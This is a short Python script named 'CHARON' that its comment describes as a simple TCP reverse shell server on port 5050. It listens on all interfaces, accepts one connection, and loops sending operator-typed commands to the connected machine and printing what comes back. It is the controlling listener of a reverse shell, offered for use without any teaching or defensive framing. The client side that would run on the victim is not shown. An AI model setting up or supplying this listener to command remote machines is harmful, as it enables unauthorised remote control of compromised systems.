# CHARON :
# socket program for create simple tcp revese shell on port 5050 for server

from socket import *

s = socket(AF_INET, SOCK_STREAM)

server = "0.0.0.0"

port = 5050

ADDR = (server,port)

s.bind((ADDR))

s.listen(5)

print("server shell running on port 5050\n")

c , ad = s.accept()

print("connected to : %s \n" % str(ad))

while True:

    cmd = input("shell=> ")
    c.sendall(cmd.encode('utf-8'))
    cmd_output = c.recv(123423)
    print(cmd_output)
    print("\n")

c.close()